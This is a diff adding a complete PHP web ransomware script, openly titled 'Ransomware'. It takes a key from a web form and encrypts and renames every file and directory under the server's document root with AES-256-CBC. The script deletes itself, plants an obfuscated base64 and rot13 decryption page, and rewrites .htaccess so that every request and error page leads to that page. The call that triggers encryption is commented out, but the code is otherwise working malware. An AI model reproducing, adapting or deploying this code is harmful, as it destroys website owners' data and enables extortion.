@@ -1,0 +1,264 @@
+<?php
+@error_reporting(0);
+@set_time_limit(0);
+@umask(0);
+class Ransomware {
+    private $root = null;
+    private $salt = null;
+    private $recovery = null;
+    private $cryptoKey = null;
+    private $cryptoKeyLength = '32';
+    private $iterations = '10000';
+    private $algorithm = 'SHA512';
+    private $iv = null;
+    private $cipher = 'AES-256-CBC';
+    private $extension = 'xkuds';
+    public function __construct($key) {
+        $this->root = $_SERVER['DOCUMENT_ROOT'];
+        $this->salt = openssl_random_pseudo_bytes(10);
+        $this->recovery = base64_encode(str_rot13(gzdeflate($key)));
+        $this->cryptoKey = @openssl_pbkdf2($key, $this->salt, $this->cryptoKeyLength, $this->iterations, $this->algorithm);
+        $this->iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($this->cipher));
+    }
+    private function generateRandomFileName($directory, $extension) {
+        $randomName = '';
+        do {
+            $randomName = str_replace(array('+', '/', '='), '', base64_encode(str_rot13(gzdeflate(openssl_random_pseudo_bytes(6)))));
+            $randomName = $randomName ? $directory . '/' . $randomName . '.' . $extension : false;
+        } while ($randomName !== false && file_exists($randomName));
+        return $randomName;
+    }
+    private function createDecryptionFile($directory) {
+        $data = gzinflate(str_rot13(base64_decode('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')));
+        $data = str_replace(
+            array(
+                '<root/>',
+                '<salt/>',
+                '<recovery/>',
+                '<cryptoKeyLength/>',
+                '<iterations/>',
+                '<algorithm/>',
+                '<iv/>',
+                '<cipher/>',
+                '<extension/>'
+            ),
+            array(
+                $this->root,
+                base64_encode(str_rot13(gzdeflate($this->salt))),
+                $this->recovery,
+                $this->cryptoKeyLength,
+                $this->iterations,
+                $this->algorithm,
+                base64_encode(str_rot13(gzdeflate($this->iv))),
+                $this->cipher,
+                $this->extension
+            ),
+            $data
+        );
+        $decryptionFile = $this->generateRandomFileName($directory, 'php');
+        if ($decryptionFile === false) {
+            $decryptionFile = "{$directory}/decrypt.php";
+        }
+        if (file_put_contents($decryptionFile, $data, LOCK_EX)) {
+            $decryptionFile = pathinfo($decryptionFile, PATHINFO_BASENAME);
+            file_put_contents($directory . '/.htaccess', "DirectoryIndex /{$decryptionFile}\nErrorDocument 400 /{$decryptionFile}\nErrorDocument 401 /{$decryptionFile}\nErrorDocument 403 /{$decryptionFile}\nErrorDocument 404 /{$decryptionFile}\nErrorDocument 500 /{$decryptionFile}\n", LOCK_EX);
+        }
+    }
+    private function encryptName($path) {
+        $encryptedName = '';
+        do {
+            $encryptedName = @openssl_encrypt(pathinfo($path, PATHINFO_BASENAME), $this->cipher, $this->cryptoKey, 0, $this->iv);
+            $encryptedName = $encryptedName ? substr($path, 0, strripos($path, '/') + 1) . urlencode($encryptedName) . '.' . $this->extension : false;
+        } while ($encryptedName !== false && file_exists($encryptedName));
+        return $encryptedName;
+    }
+    private function encryptDirectory($directory) {
+        $encryptedDirectory = $this->encryptName($directory);
+        if ($encryptedDirectory !== false) {
+            rename($directory, $encryptedDirectory);
+        }
+    }
+    private function encryptFile($file) {
+        $encryptedData = @openssl_encrypt(file_get_contents($file), $this->cipher, $this->cryptoKey, 0, $this->iv);
+        if ($encryptedData !== false) {
+            $encryptedFile = $this->encryptName($file);
+            if ($encryptedFile !== false && rename($file, $encryptedFile)) {
+                if (!file_put_contents($encryptedFile, $encryptedData, LOCK_EX)) {
+                    rename($encryptedFile, $file);
+                }
+            }
+        }
+    }
+    private function scan($directory) {
+        $files = @array_diff(scandir($directory), array('.', '..'));
+        if ($files !== false) {
+            foreach ($files as $file) {
+                $path = $directory . '/' . $file;
+                if (is_dir($path)) {
+                    $this->scan($path);
+                    $this->encryptDirectory($path);
+                } else {
+                    $this->encryptFile($path);
+                }
+            }
+        }
+    }
+    public function run() {
+        unlink($_SERVER['SCRIPT_FILENAME']);
+        if ($this->cryptoKey !== false) {
+            $this->scan($this->root);
+            $this->createDecryptionFile($this->root);
+        }
+    }
+}
+$errorMessage = '';
+if (isset($_SERVER['REQUEST_METHOD']) && strtolower($_SERVER['REQUEST_METHOD']) === 'post' && isset($_POST['key'])) {
+    mb_internal_encoding('UTF-8');
+    if (mb_strlen($_POST['key']) < 1) {
+        $errorMessage = 'Please enter encryption key';
+    } else if (!extension_loaded('openssl')) {
+        $errorMessage = 'OpenSSL not enabled';
+    } else {
+        $ransomware = new Ransomware($_POST['key']);
+        // $ransomware->run();
+        unset($_POST['key'], $ransomware);
+        @gc_collect_cycles();
+        header('Location: /');
+        exit();
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8">
+		<title>Ransomware</title>
+		<meta name="description" content="Ransomware written in PHP.">
+		<meta name="keywords" content="HTML, CSS, PHP, ransomware">
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<style>
+			html {
+				height: 100%;
+			}
+			body {
+				background-color: #262626;
+				display: flex;
+				flex-direction: column;
+				margin: 0;
+				height: inherit;
+				color: #F8F8F8;
+				font-family: Arial, Helvetica, sans-serif;
+				font-size: 1em;
+				font-weight: 400;
+				text-align: left;
+			}
+			.front-form {
+				display: flex;
+				flex-direction: column;
+				align-items: center;
+				justify-content: center;
+				flex: 1 0 auto;
+				padding: 0.5em;
+			}
+			.front-form .layout {
+				background-color: #DCDCDC;
+				padding: 1.5em;
+				width: 21em;
+				color: #000;
+				border: 0.07em solid #000;
+			}
+			.front-form .layout header {
+				text-align: center;
+			}
+			.front-form .layout header .title {
+				margin: 0;
+				font-size: 2.6em;
+				font-weight: 400;
+			}
+			.front-form .layout header p {
+				margin: 0;
+				font-size: 1.2em;
+			}
+			.front-form .layout .advice p {
+				margin: 1em 0 0 0;
+			}
+			.front-form .layout form {
+				display: flex;
+				flex-direction: column;
+				margin-top: 1em;
+			}
+			.front-form .layout form input {
+				-webkit-appearance: none;
+				-moz-appearance: none;
+				appearance: none;
+				margin: 0;
+				padding: 0.2em 0.4em;
+				font-family: Arial, Helvetica, sans-serif;
+				font-size: 1em;
+				border: 0.07em solid #9D2A00;
+				-webkit-border-radius: 0;
+				-moz-border-radius: 0;
+				border-radius: 0;
+			}
+			.front-form .layout form input[type="submit"] {
+				background-color: #FF4500;
+				color: #F8F8F8;
+				cursor: pointer;
+				transition: background-color 220ms linear;
+			}
+			.front-form .layout form input[type="submit"]:hover {
+				background-color: #D83A00;
+				transition: background-color 220ms linear;
+			}
+			.front-form .layout form .error {
+				margin: 0 0 1em 0;
+				color: #9D2A00;
+				font-size: 0.8em;
+			}
+			.front-form .layout form .error:not(:empty) {
+				margin: 0.2em 0 1em 0;
+			}
+			.front-form .layout form label {
+				margin-bottom: 0.2em;
+				height: 1.2em;
+			}
+			@media screen and (max-width: 480px) {
+				.front-form .layout {
+					width: 15.5em;
+				}
+			}
+			@media screen and (max-width: 320px) {
+				.front-form .layout {
+					width: 14.5em;
+				}
+				.front-form .layout header .title {
+					font-size: 2.4em;
+				}
+				.front-form .layout header p {
+					font-size: 1.1em;
+				}
+				.front-form .layout .advice p {
+					font-size: 0.9em;
+				}
+			}
+		</style>
+	</head>
+	<body>
+		<div class="front-form">
+			<div class="layout">
+				<header>
+					<h1 class="title">Ransomware</h1>
+				</header>
+				<form method="post" action="<?php echo './' . pathinfo($_SERVER['SCRIPT_FILENAME'], PATHINFO_BASENAME); ?>">
+					<label for="key">Encryption Key</label>
+					<input name="key" id="key" type="text" spellcheck="false" autofocus="autofocus">
+					<p class="error"><?php echo $errorMessage; ?></p>
+					<input type="submit" value="Encrypt">
+				</form>
+				<div class="advice">
+					<p>Backup your server files!</p>
+				</div>
+			</div>
+		</div>
+	</body>
+</html>
